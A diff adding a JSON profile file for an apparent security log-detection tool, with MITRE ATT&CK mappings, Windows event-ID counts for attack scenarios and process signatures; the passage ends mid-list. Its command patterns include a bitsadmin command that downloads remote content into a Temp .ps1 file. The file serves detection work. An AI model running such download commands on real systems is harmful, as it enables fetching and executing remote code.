@@ -1,0 +1,2449 @@
+{
+  "trained_at": "2026-11-10T02:23:40.201852+00:00",
+  "total_mordor_files": 11,
+  "total_loghub_files": 3,
+  "total_wazuh_files": 4,
+  "total_knowledge_docs": 20,
+  "total_events_trained": 11626,
+  "total_suspicious_events": 8022,
+  "scenarios_learned": 18,
+  "mitre_coverage_count": 40,
+  "observed_dataset_mitre_ids": [
+    "T1003.001",
+    "T1003.003",
+    "T1003.006",
+    "T1018",
+    "T1021.002",
+    "T1021.006",
+    "T1027",
+    "T1027.001",
+    "T1037.001",
+    "T1046",
+    "T1053.005",
+    "T1055.003",
+    "T1056.002",
+    "T1059.001",
+    "T1059.005",
+    "T1069.001",
+    "T1069.002",
+    "T1071.001",
+    "T1078",
+    "T1078.002",
+    "T1078.004",
+    "T1087",
+    "T1087.001",
+    "T1087.002",
+    "T1105",
+    "T1110",
+    "T1110.003",
+    "T1112",
+    "T1190",
+    "T1197",
+    "T1222.001",
+    "T1530",
+    "T1543.003",
+    "T1546.003",
+    "T1547.001",
+    "T1548.003",
+    "T1550.002",
+    "T1574.001",
+    "T1580",
+    "T1595.002"
+  ],
+  "rag_mitre_techniques_count": 40,
+  "rag_wazuh_rules_count": 19,
+  "model_saved_path": "/home/nam/Desktop/TLCN-NAM/TLCN/data/models/trained_log_profiles.json",
+  "event_to_mitre_mapping": {
+    "1": [
+      "T1059.001",
+      "T1059.004",
+      "T1053.005",
+      "T1490",
+      "T1105"
+    ],
+    "3": [
+      "T1071.001",
+      "T1046",
+      "T1018",
+      "T1021.002",
+      "T1041",
+      "T1547.001"
+    ],
+    "7": [
+      "T1059.001",
+      "T1056.002",
+      "T1003.001",
+      "T1197",
+      "T1105",
+      "T1543.003",
+      "T1087.002",
+      "T1087",
+      "T1018",
+      "T1046",
+      "T1078.002",
+      "T1037.001",
+      "T1021.006",
+      "T1071.001"
+    ],
+    "10": [
+      "T1003.001",
+      "T1056.002",
+      "T1197",
+      "T1105",
+      "T1003.003",
+      "T1543.003",
+      "T1087.002",
+      "T1087",
+      "T1018",
+      "T1046",
+      "T1078.002",
+      "T1037.001",
+      "T1021.006",
+      "T1021.002",
+      "T1059.001",
+      "T1071.001"
+    ],
+    "11": [
+      "T1486",
+      "T1505.003",
+      "T1105",
+      "T1003.003",
+      "T1037.001",
+      "T1021.002",
+      "T1056.002",
+      "T1059.001"
+    ],
+    "12": [
+      "T1053.005",
+      "T1078.002",
+      "T1197",
+      "T1105",
+      "T1003.001",
+      "T1543.003",
+      "T1087.002",
+      "T1087",
+      "T1018",
+      "T1046",
+      "T1037.001",
+      "T1021.002",
+      "T1056.002",
+      "T1059.001",
+      "T1071.001"
+    ],
+    "13": [
+      "T1053.005",
+      "T1078.002",
+      "T1197",
+      "T1105",
+      "T1003.001",
+      "T1543.003",
+      "T1087.002",
+      "T1087",
+      "T1018",
+      "T1046",
+      "T1037.001",
+      "T1021.002",
+      "T1056.002",
+      "T1059.001",
+      "T1071.001"
+    ],
+    "22": [
+      "T1071.001",
+      "T1018"
+    ],
+    "104": [
+      "T1070.001"
+    ],
+    "1102": [
+      "T1070.001",
+      "T1056.002",
+      "T1059.001",
+      "T1071.001"
+    ],
+    "4103": [
+      "T1059.001",
+      "T1056.002",
+      "T1027",
+      "T1547.001"
+    ],
+    "4104": [
+      "T1059.001",
+      "T1056.002",
+      "T1027"
+    ],
+    "4624": [
+      "T1078.002",
+      "T1021.002"
+    ],
+    "4625": [
+      "T1110",
+      "T1078.002"
+    ],
+    "4661": [
+      "T1087",
+      "T1087.002",
+      "T1003.003"
+    ],
+    "4672": [
+      "T1078.002",
+      "T1087.002"
+    ],
+    "4688": [
+      "T1059.001",
+      "T1490",
+      "T1087"
+    ],
+    "4698": [
+      "T1053.005"
+    ],
+    "4798": [
+      "T1087",
+      "T1087.002"
+    ],
+    "4799": [
+      "T1087",
+      "T1087.002",
+      "T1003.003"
+    ],
+    "5140": [
+      "T1021.002",
+      "T1087.002"
+    ],
+    "5145": [
+      "T1021.002",
+      "T1087.002"
+    ],
+    "5156": [
+      "T1071.001",
+      "T1046",
+      "T1018",
+      "T1197",
+      "T1105",
+      "T1003.003",
+      "T1037.001",
+      "T1021.006",
+      "T1021.002",
+      "T1547.001",
+      "T1056.002",
+      "T1059.001"
+    ],
+    "5158": [
+      "T1071.001",
+      "T1003.003",
+      "T1037.001",
+      "T1021.006",
+      "T1021.002",
+      "T1547.001",
+      "T1056.002",
+      "T1059.001"
+    ],
+    "4658": [
+      "T1197",
+      "T1105",
+      "T1003.003",
+      "T1003.001",
+      "T1543.003",
+      "T1087.002",
+      "T1087",
+      "T1018",
+      "T1046",
+      "T1078.002",
+      "T1021.006",
+      "T1547.001"
+    ],
+    "4656": [
+      "T1197",
+      "T1105",
+      "T1003.001",
+      "T1543.003",
+      "T1087.002",
+      "T1087",
+      "T1018",
+      "T1046",
+      "T1078.002",
+      "T1021.006",
+      "T1547.001"
+    ],
+    "4703": [
+      "T1197",
+      "T1105"
+    ],
+    "412": [
+      "T1003.003"
+    ],
+    "4663": [
+      "T1003.001",
+      "T1543.003",
+      "T1087.002",
+      "T1087",
+      "T1018",
+      "T1046",
+      "T1078.002",
+      "T1021.006"
+    ],
+    "4690": [
+      "T1003.001",
+      "T1543.003",
+      "T1087.002",
+      "T1087",
+      "T1018",
+      "T1046",
+      "T1078.002",
+      "T1021.006",
+      "T1547.001"
+    ],
+    "9": [
+      "T1037.001"
+    ],
+    "4689": [
+      "T1021.002"
+    ],
+    "5": [
+      "T1021.002"
+    ],
+    "800": [
+      "T1547.001"
+    ],
+    "5154": [
+      "T1059.001",
+      "T1071.001"
+    ]
+  },
+  "event_id_distributions": {
+    "Defense Evasion & C2 / BITSAdmin Tool Transfer": {
+      "7": 141,
+      "10": 96,
+      "12": 55,
+      "4658": 16,
+      "13": 15,
+      "5156": 12,
+      "4656": 11,
+      "4703": 11,
+      "4690": 8,
+      "4663": 8,
+      "3": 8,
+      "5158": 6,
+      "11": 6,
+      "9": 4,
+      "22": 3
+    },
+    "Credential Access / NTDS.dit Active Directory Dump": {
+      "4658": 456,
+      "4661": 372,
+      "10": 286,
+      "4799": 186,
+      "5156": 148,
+      "11": 59,
+      "5158": 53,
+      "412": 48,
+      "23": 48,
+      "4690": 42,
+      "4656": 42,
+      "13": 37,
+      "12": 36,
+      "9": 26,
+      "28": 22
+    },
+    "Credential Access / LSASS Memory Dump via Syscalls": {
+      "10": 44,
+      "13": 23,
+      "7": 21,
+      "4658": 6,
+      "4663": 3,
+      "4656": 3,
+      "4690": 3,
+      "12": 3,
+      "5156": 2,
+      "5158": 2,
+      "11": 2,
+      "4689": 1,
+      "4703": 1,
+      "4688": 1,
+      "1102": 1
+    },
+    "Privilege Escalation / Windows Service Modification": {
+      "12": 159,
+      "7": 97,
+      "10": 59,
+      "4658": 36,
+      "4690": 18,
+      "4656": 18,
+      "13": 14,
+      "4663": 6,
+      "4688": 4,
+      "4689": 4,
+      "1": 4,
+      "5": 4,
+      "11": 3,
+      "5158": 2,
+      "5156": 2
+    },
+    "Discovery / SharpView Active Directory Enumeration": {
+      "7": 85,
+      "10": 49,
+      "4658": 34,
+      "13": 23,
+      "4690": 17,
+      "4656": 17,
+      "12": 12,
+      "4663": 6,
+      "5158": 6,
+      "11": 4,
+      "5156": 3,
+      "22": 3,
+      "1102": 1,
+      "4688": 1,
+      "4673": 1
+    },
+    "Persistence / Logon Script Modification": {
+      "10": 65,
+      "13": 19,
+      "7": 11,
+      "5158": 5,
+      "5156": 5,
+      "11": 4,
+      "12": 3,
+      "9": 3,
+      "1102": 1,
+      "4688": 1,
+      "4689": 1,
+      "24": 1,
+      "1": 1,
+      "5": 1,
+      "104": 1
+    },
+    "Lateral Movement / WinRM WSMan Automation": {
+      "7": 165,
+      "10": 149,
+      "4658": 94,
+      "5156": 61,
+      "5158": 56,
+      "4656": 48,
+      "4690": 47,
+      "4663": 43,
+      "12": 42,
+      "3": 18,
+      "13": 16,
+      "11": 11,
+      "600": 8,
+      "9": 6,
+      "4703": 5
+    },
+    "Lateral Movement / SMB Admin Share Copy": {
+      "12": 245,
+      "10": 79,
+      "13": 76,
+      "5158": 49,
+      "5156": 28,
+      "11": 5,
+      "4689": 3,
+      "5": 3,
+      "5145": 3,
+      "3": 3,
+      "4672": 2,
+      "4624": 2,
+      "4627": 2,
+      "5140": 2,
+      "4634": 2
+    },
+    "Persistence / Registry Run Keys Modification": {
+      "5156": 197,
+      "800": 73,
+      "4658": 69,
+      "4103": 62,
+      "3": 46,
+      "5158": 35,
+      "4690": 32,
+      "4656": 32,
+      "10": 30,
+      "12": 19,
+      "13": 13,
+      "7": 10,
+      "4634": 5,
+      "4624": 4,
+      "4627": 4
+    },
+    "Credential Access / GUI Input Capture (PowerShell PromptForCredential)": {
+      "10": 98,
+      "13": 18,
+      "7": 16,
+      "12": 15,
+      "11": 7,
+      "5158": 2,
+      "5156": 2,
+      "1102": 1,
+      "5379": 1,
+      "23": 1,
+      "9": 1,
+      "104": 1
+    },
+    "Execution / C2 HttpListener (PowerShell System.Net.HttpListener)": {
+      "10": 67,
+      "13": 15,
+      "12": 13,
+      "7": 8,
+      "5158": 3,
+      "1102": 1,
+      "5156": 1,
+      "5154": 1,
+      "22": 1
+    },
+    "Initial Access & Impact / Apache Web Server Error & Worker Anomaly (LogHub)": {
+      "WebLog": 2000
+    },
+    "Credential Access & Privilege Escalation / Linux Syslog & PAM Auth (LogHub)": {
+      "LinuxSyslog-ftpd": 916,
+      "LinuxSyslog-linux-daemon": 853,
+      "LinuxSyslog-kernel": 76,
+      "LinuxSyslog-klogind": 46,
+      "LinuxSyslog-logrotate": 43,
+      "LinuxSyslog-named": 16,
+      "LinuxSyslog-cups": 12,
+      "LinuxSyslog-udev": 8,
+      "LinuxSyslog-1.4.1": 7,
+      "LinuxSyslog-gpm": 2
+    },
+    "Credential Access / OpenSSH Brute Force & Auth Failures (LogHub)": {
+      "LinuxSyslog-sshd": 2000
+    },
+    "Wazuh Scenario (wazuh_alerts_scenario1_phishing.json)": {
+      "60105": 1,
+      "60106": 1,
+      "60115": 1
+    },
+    "Wazuh Scenario (wazuh_alerts_scenario2_malware.json)": {
+      "92211": 1,
+      "92215": 1,
+      "92213": 1,
+      "92218": 1
+    },
+    "Wazuh Scenario (wazuh_alerts_scenario3_network_scan.json)": {
+      "5712": 1,
+      "5710": 1,
+      "5715": 1
+    },
+    "Wazuh Scenario (wazuh_alerts_scenario4_benign.json)": {
+      "60100": 1
+    }
+  },
+  "process_signatures": [
+    {
+      "process_name": "svchost.exe",
+      "occurrences": 299,
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "mitre_techniques": [
+        "T1197",
+        "T1105"
+      ],
+      "attack_category": "MALWARE"
+    },
+    {
+      "process_name": "explorer.exe",
+      "occurrences": 40,
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "mitre_techniques": [
+        "T1197",
+        "T1105"
+      ],
+      "attack_category": "MALWARE"
+    },
+    {
+      "process_name": "bitsadmin.exe",
+      "occurrences": 31,
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "mitre_techniques": [
+        "T1197",
+        "T1105"
+      ],
+      "attack_category": "MALWARE"
+    },
+    {
+      "process_name": "lsass.exe",
+      "occurrences": 12,
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "mitre_techniques": [
+        "T1197",
+        "T1105"
+      ],
+      "attack_category": "MALWARE"
+    },
+    {
+      "process_name": "services.exe",
+      "occurrences": 9,
+      "scenario": "Defense Evasion & C2 / BITSAdmin Tool Transfer",
+      "mitre_techniques": [
+        "T1197",
+        "T1105"
+      ],
+      "attack_category": "MALWARE"
+    },
+    {
+      "process_name": "lsass.exe",
+      "occurrences": 847,
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "mitre_techniques": [
+        "T1003.003"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    },
+    {
+      "process_name": "vboxservice.exe",
+      "occurrences": 271,
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "mitre_techniques": [
+        "T1003.003"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    },
+    {
+      "process_name": "taskhostw.exe",
+      "occurrences": 176,
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "mitre_techniques": [
+        "T1003.003"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    },
+    {
+      "process_name": "svchost.exe",
+      "occurrences": 84,
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "mitre_techniques": [
+        "T1003.003"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    },
+    {
+      "process_name": "dns.exe",
+      "occurrences": 58,
+      "scenario": "Credential Access / NTDS.dit Active Directory Dump",
+      "mitre_techniques": [
+        "T1003.003"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    },
+    {
+      "process_name": "explorer.exe",
+      "occurrences": 43,
+      "scenario": "Credential Access / LSASS Memory Dump via Syscalls",
+      "mitre_techniques": [
+        "T1003.001"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    },
+    {
+      "process_name": "outflank-dumpert.exe",
+      "occurrences": 39,
+      "scenario": "Credential Access / LSASS Memory Dump via Syscalls",
+      "mitre_techniques": [
+        "T1003.001"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    },
+    {
+      "process_name": "lsass.exe",
+      "occurrences": 12,
+      "scenario": "Credential Access / LSASS Memory Dump via Syscalls",
+      "mitre_techniques": [
+        "T1003.001"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    },
+    {
+      "process_name": "svchost.exe",
+      "occurrences": 11,
+      "scenario": "Credential Access / LSASS Memory Dump via Syscalls",
+      "mitre_techniques": [
+        "T1003.001"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    },
+    {
+      "process_name": "cmd.exe",
+      "occurrences": 3,
+      "scenario": "Credential Access / LSASS Memory Dump via Syscalls",
+      "mitre_techniques": [
+        "T1003.001"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    },
+    {
+      "process_name": "powershell.exe",
+      "occurrences": 294,
+      "scenario": "Privilege Escalation / Windows Service Modification",
+      "mitre_techniques": [
+        "T1543.003"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "explorer.exe",
+      "occurrences": 39,
+      "scenario": "Privilege Escalation / Windows Service Modification",
+      "mitre_techniques": [
+        "T1543.003"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "sc.exe",
+      "occurrences": 32,
+      "scenario": "Privilege Escalation / Windows Service Modification",
+      "mitre_techniques": [
+        "T1543.003"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "svchost.exe",
+      "occurrences": 22,
+      "scenario": "Privilege Escalation / Windows Service Modification",
+      "mitre_techniques": [
+        "T1543.003"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "services.exe",
+      "occurrences": 8,
+      "scenario": "Privilege Escalation / Windows Service Modification",
+      "mitre_techniques": [
+        "T1543.003"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "sharpview.exe",
+      "occurrences": 177,
+      "scenario": "Discovery / SharpView Active Directory Enumeration",
+      "mitre_techniques": [
+        "T1087.002",
+        "T1087",
+        "T1018",
+        "T1046",
+        "T1078.002"
+      ],
+      "attack_category": "RECONNAISSANCE"
+    },
+    {
+      "process_name": "svchost.exe",
+      "occurrences": 36,
+      "scenario": "Discovery / SharpView Active Directory Enumeration",
+      "mitre_techniques": [
+        "T1087.002",
+        "T1087",
+        "T1018",
+        "T1046",
+        "T1078.002"
+      ],
+      "attack_category": "RECONNAISSANCE"
+    },
+    {
+      "process_name": "explorer.exe",
+      "occurrences": 29,
+      "scenario": "Discovery / SharpView Active Directory Enumeration",
+      "mitre_techniques": [
+        "T1087.002",
+        "T1087",
+        "T1018",
+        "T1046",
+        "T1078.002"
+      ],
+      "attack_category": "RECONNAISSANCE"
+    },
+    {
+      "process_name": "lsass.exe",
+      "occurrences": 3,
+      "scenario": "Discovery / SharpView Active Directory Enumeration",
+      "mitre_techniques": [
+        "T1087.002",
+        "T1087",
+        "T1018",
+        "T1046",
+        "T1078.002"
+      ],
+      "attack_category": "RECONNAISSANCE"
+    },
+    {
+      "process_name": "cmd.exe",
+      "occurrences": 2,
+      "scenario": "Discovery / SharpView Active Directory Enumeration",
+      "mitre_techniques": [
+        "T1087.002",
+        "T1087",
+        "T1018",
+        "T1046",
+        "T1078.002"
+      ],
+      "attack_category": "RECONNAISSANCE"
+    },
+    {
+      "process_name": "explorer.exe",
+      "occurrences": 43,
+      "scenario": "Persistence / Logon Script Modification",
+      "mitre_techniques": [
+        "T1037.001"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "svchost.exe",
+      "occurrences": 40,
+      "scenario": "Persistence / Logon Script Modification",
+      "mitre_techniques": [
+        "T1037.001"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "reg.exe",
+      "occurrences": 15,
+      "scenario": "Persistence / Logon Script Modification",
+      "mitre_techniques": [
+        "T1037.001"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "windowsazureguestagent.exe",
+      "occurrences": 6,
+      "scenario": "Persistence / Logon Script Modification",
+      "mitre_techniques": [
+        "T1037.001"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "waappagent.exe",
+      "occurrences": 4,
+      "scenario": "Persistence / Logon Script Modification",
+      "mitre_techniques": [
+        "T1037.001"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "svchost.exe",
+      "occurrences": 387,
+      "scenario": "Lateral Movement / WinRM WSMan Automation",
+      "mitre_techniques": [
+        "T1021.006"
+      ],
+      "attack_category": "LATERAL_MOVEMENT"
+    },
+    {
+      "process_name": "grunthttp.exe",
+      "occurrences": 76,
+      "scenario": "Lateral Movement / WinRM WSMan Automation",
+      "mitre_techniques": [
+        "T1021.006"
+      ],
+      "attack_category": "LATERAL_MOVEMENT"
+    },
+    {
+      "process_name": "wmiprvse.exe",
+      "occurrences": 54,
+      "scenario": "Lateral Movement / WinRM WSMan Automation",
+      "mitre_techniques": [
+        "T1021.006"
+      ],
+      "attack_category": "LATERAL_MOVEMENT"
+    },
+    {
+      "process_name": "windowsazureguestagent.exe",
+      "occurrences": 53,
+      "scenario": "Lateral Movement / WinRM WSMan Automation",
+      "mitre_techniques": [
+        "T1021.006"
+      ],
+      "attack_category": "LATERAL_MOVEMENT"
+    },
+    {
+      "process_name": "conhost.exe",
+      "occurrences": 46,
+      "scenario": "Lateral Movement / WinRM WSMan Automation",
+      "mitre_techniques": [
+        "T1021.006"
+      ],
+      "attack_category": "LATERAL_MOVEMENT"
+    },
+    {
+      "process_name": "svchost.exe",
+      "occurrences": 254,
+      "scenario": "Lateral Movement / SMB Admin Share Copy",
+      "mitre_techniques": [
+        "T1021.002"
+      ],
+      "attack_category": "LATERAL_MOVEMENT"
+    },
+    {
+      "process_name": "lsass.exe",
+      "occurrences": 155,
+      "scenario": "Lateral Movement / SMB Admin Share Copy",
+      "mitre_techniques": [
+        "T1021.002"
+      ],
+      "attack_category": "LATERAL_MOVEMENT"
+    },
+    {
+      "process_name": "windowsazureguestagent.exe",
+      "occurrences": 30,
+      "scenario": "Lateral Movement / SMB Admin Share Copy",
+      "mitre_techniques": [
+        "T1021.002"
+      ],
+      "attack_category": "LATERAL_MOVEMENT"
+    },
+    {
+      "process_name": "officeclicktorun.exe",
+      "occurrences": 11,
+      "scenario": "Lateral Movement / SMB Admin Share Copy",
+      "mitre_techniques": [
+        "T1021.002"
+      ],
+      "attack_category": "LATERAL_MOVEMENT"
+    },
+    {
+      "process_name": "explorer.exe",
+      "occurrences": 10,
+      "scenario": "Lateral Movement / SMB Admin Share Copy",
+      "mitre_techniques": [
+        "T1021.002"
+      ],
+      "attack_category": "LATERAL_MOVEMENT"
+    },
+    {
+      "process_name": "powershell.exe",
+      "occurrences": 277,
+      "scenario": "Persistence / Registry Run Keys Modification",
+      "mitre_techniques": [
+        "T1547.001"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "windowsazureguestagent.exe",
+      "occurrences": 126,
+      "scenario": "Persistence / Registry Run Keys Modification",
+      "mitre_techniques": [
+        "T1547.001"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "svchost.exe",
+      "occurrences": 107,
+      "scenario": "Persistence / Registry Run Keys Modification",
+      "mitre_techniques": [
+        "T1547.001"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "networkwatcheragent.exe",
+      "occurrences": 35,
+      "scenario": "Persistence / Registry Run Keys Modification",
+      "mitre_techniques": [
+        "T1547.001"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "lsass.exe",
+      "occurrences": 28,
+      "scenario": "Persistence / Registry Run Keys Modification",
+      "mitre_techniques": [
+        "T1547.001"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "explorer.exe",
+      "occurrences": 83,
+      "scenario": "Credential Access / GUI Input Capture (PowerShell PromptForCredential)",
+      "mitre_techniques": [
+        "T1056.002",
+        "T1059.001"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    },
+    {
+      "process_name": "svchost.exe",
+      "occurrences": 41,
+      "scenario": "Credential Access / GUI Input Capture (PowerShell PromptForCredential)",
+      "mitre_techniques": [
+        "T1056.002",
+        "T1059.001"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    },
+    {
+      "process_name": "powershell.exe",
+      "occurrences": 20,
+      "scenario": "Credential Access / GUI Input Capture (PowerShell PromptForCredential)",
+      "mitre_techniques": [
+        "T1056.002",
+        "T1059.001"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    },
+    {
+      "process_name": "ctfmon.exe",
+      "occurrences": 7,
+      "scenario": "Credential Access / GUI Input Capture (PowerShell PromptForCredential)",
+      "mitre_techniques": [
+        "T1056.002",
+        "T1059.001"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    },
+    {
+      "process_name": "windowsazureguestagent.exe",
+      "occurrences": 4,
+      "scenario": "Credential Access / GUI Input Capture (PowerShell PromptForCredential)",
+      "mitre_techniques": [
+        "T1056.002",
+        "T1059.001"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    },
+    {
+      "process_name": "explorer.exe",
+      "occurrences": 51,
+      "scenario": "Execution / C2 HttpListener (PowerShell System.Net.HttpListener)",
+      "mitre_techniques": [
+        "T1059.001",
+        "T1071.001"
+      ],
+      "attack_category": "MALWARE"
+    },
+    {
+      "process_name": "svchost.exe",
+      "occurrences": 34,
+      "scenario": "Execution / C2 HttpListener (PowerShell System.Net.HttpListener)",
+      "mitre_techniques": [
+        "T1059.001",
+        "T1071.001"
+      ],
+      "attack_category": "MALWARE"
+    },
+    {
+      "process_name": "powershell.exe",
+      "occurrences": 16,
+      "scenario": "Execution / C2 HttpListener (PowerShell System.Net.HttpListener)",
+      "mitre_techniques": [
+        "T1059.001",
+        "T1071.001"
+      ],
+      "attack_category": "MALWARE"
+    },
+    {
+      "process_name": "system",
+      "occurrences": 3,
+      "scenario": "Execution / C2 HttpListener (PowerShell System.Net.HttpListener)",
+      "mitre_techniques": [
+        "T1059.001",
+        "T1071.001"
+      ],
+      "attack_category": "MALWARE"
+    },
+    {
+      "process_name": "windowsazureguestagent.exe",
+      "occurrences": 2,
+      "scenario": "Execution / C2 HttpListener (PowerShell System.Net.HttpListener)",
+      "mitre_techniques": [
+        "T1059.001",
+        "T1071.001"
+      ],
+      "attack_category": "MALWARE"
+    },
+    {
+      "process_name": "webserver",
+      "occurrences": 2000,
+      "scenario": "Initial Access & Impact / Apache Web Server Error & Worker Anomaly (LogHub)",
+      "mitre_techniques": [
+        "T1190",
+        "T1071.001"
+      ],
+      "attack_category": "WEB_ATTACK"
+    },
+    {
+      "process_name": "ftpd",
+      "occurrences": 916,
+      "scenario": "Credential Access & Privilege Escalation / Linux Syslog & PAM Auth (LogHub)",
+      "mitre_techniques": [
+        "T1110",
+        "T1548.003",
+        "T1078"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "linux-daemon",
+      "occurrences": 853,
+      "scenario": "Credential Access & Privilege Escalation / Linux Syslog & PAM Auth (LogHub)",
+      "mitre_techniques": [
+        "T1110",
+        "T1548.003",
+        "T1078"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "kernel",
+      "occurrences": 76,
+      "scenario": "Credential Access & Privilege Escalation / Linux Syslog & PAM Auth (LogHub)",
+      "mitre_techniques": [
+        "T1110",
+        "T1548.003",
+        "T1078"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "klogind",
+      "occurrences": 46,
+      "scenario": "Credential Access & Privilege Escalation / Linux Syslog & PAM Auth (LogHub)",
+      "mitre_techniques": [
+        "T1110",
+        "T1548.003",
+        "T1078"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "logrotate",
+      "occurrences": 43,
+      "scenario": "Credential Access & Privilege Escalation / Linux Syslog & PAM Auth (LogHub)",
+      "mitre_techniques": [
+        "T1110",
+        "T1548.003",
+        "T1078"
+      ],
+      "attack_category": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "process_name": "sshd",
+      "occurrences": 2000,
+      "scenario": "Credential Access / OpenSSH Brute Force & Auth Failures (LogHub)",
+      "mitre_techniques": [
+        "T1110",
+        "T1078"
+      ],
+      "attack_category": "CREDENTIAL_ACCESS"
+    }
+  ],
+  "command_patterns": [
+    "The audit log was cleared. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Domain Name: WORKSTATION5 Logon ID: 0xC61D9",
+    "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\wardog\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
+    "The handle to an object was closed. Subject : Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Account Domain: WORKSTATION5 Logon ID: 0xC61D9 Object: Object Server: Security Handle ID: 0x3d18 Process Information",
+    "A handle to an object was requested. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Account Domain: WORKSTATION5 Logon ID: 0xC61D9 Object: Object Server: Security Object Type: Key Object Name: \\REGIST",
+    "An attempt was made to access an object. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Account Domain: WORKSTATION5 Logon ID: 0xC61D9 Object: Object Server: Security Object Type: Key Object Name: \\RE",
+    "The handle to an object was closed. Subject : Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Account Domain: WORKSTATION5 Logon ID: 0xC61D9 Object: Object Server: Security Handle ID: 0xa0 Process Information: ",
+    "An account was successfully logged on. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION5$ Account Domain: WORKGROUP Logon ID: 0x3E7 Logon Information: Logon Type: 5 Restricted Admin Mode: - Virtual Account: No Elevated Token: Yes Im",
+    "Special privileges assigned to new logon. Subject: Security ID: S-1-5-18 Account Name: SYSTEM Account Domain: NT AUTHORITY Logon ID: 0x3E7 Privileges: SeAssignPrimaryTokenPrivilege SeTcbPrivilege SeSecurityPrivilege SeTakeOwnershipPrivilege",
+    "A handle to an object was requested. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION5$ Account Domain: WORKGROUP Logon ID: 0x3E7 Object: Object Server: Security Object Type: Key Object Name: \\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\C",
+    "An attempt was made to access an object. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION5$ Account Domain: WORKGROUP Logon ID: 0x3E7 Object: Object Server: Security Object Type: Key Object Name: \\REGISTRY\\MACHINE\\SYSTEM\\ControlSet0",
+    "C:\\windows\\System32\\svchost.exe -k netsvcs -p -s BITS",
+    "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 4584 Application Name: \\device\\harddiskvolume2\\windows\\system32\\svchost.exe Network Information: Direction: Outbound Source Address: 192.168.2.5",
+    "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 4584 Application Name: \\device\\harddiskvolume2\\windows\\system32\\svchost.exe Network Information: Direction: Outbound Source Address: 127.0.0.1 S",
+    "The Windows Filtering Platform has permitted a connection. Application Information: Process ID: 4584 Application Name: \\device\\harddiskvolume2\\windows\\system32\\svchost.exe Network Information: Direction: Inbound Source Address: 127.0.0.1 So",
+    "A handle to an object was requested. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION5$ Account Domain: WORKGROUP Logon ID: 0x3E7 Object: Object Server: Security Object Type: Key Object Name: \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Win",
+    "An attempt was made to access an object. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION5$ Account Domain: WORKGROUP Logon ID: 0x3E7 Object: Object Server: Security Object Type: Key Object Name: \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft",
